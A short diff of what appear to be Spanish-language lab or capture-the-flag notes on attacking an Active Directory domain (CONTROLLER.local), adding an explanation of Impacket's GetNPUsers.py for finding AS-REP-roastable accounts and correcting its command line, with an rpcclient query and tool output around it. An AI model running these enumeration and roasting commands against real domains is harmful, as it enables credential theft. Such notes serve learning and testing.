@@ -142,7 +142,13 @@ rpcclient $> queryuser 0x1f4
 
 
 
-ython3  GetNPUsers.py -usersfile /home/kali/Downloads/kerberos/userK.txt -no-pass CONTROLLER.local/
+## Impacket cuenta con una herramienta llamada "GetNPUsers.py" (ubicada en impacket/examples/GetNPUsers.py) que nos permite consultar cuentas ASReproastables desde el Centro de Distribución de Claves. Lo único necesario para consultar las cuentas es un conjunto válido de nombres de usuario que enumeramos previamente mediante Kerbrute.
+
+
+
+python3  GetNPUsers.py -usersfile /home/kali/Downloads/kerberos/userK.txt -no-pass CONTROLLER.local/
+
+
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
